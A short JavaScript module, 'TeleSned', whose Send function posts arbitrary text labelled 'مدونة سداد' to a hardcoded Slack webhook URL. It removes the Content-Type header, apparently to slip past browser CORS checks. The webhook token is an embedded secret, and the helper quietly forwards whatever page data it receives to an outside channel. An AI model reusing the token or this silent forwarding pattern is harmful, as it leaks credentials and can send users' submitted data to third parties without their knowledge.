import axios from 'axios';


export const TeleSned = () => {
    
    const Send = async (des) => {
        const text = `مدونة سداد %0A ${des}`;
        await axios.post(`https://hooks.slack.com/services/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`,JSON.stringify(text),{
            withCredentials:false,
            transformRequest:[(data,headers) =>{
                delete headers.post["Content-Type"]
                return text
            }]
        })
    }
  return {
    Send,
}
}

export default TeleSned;
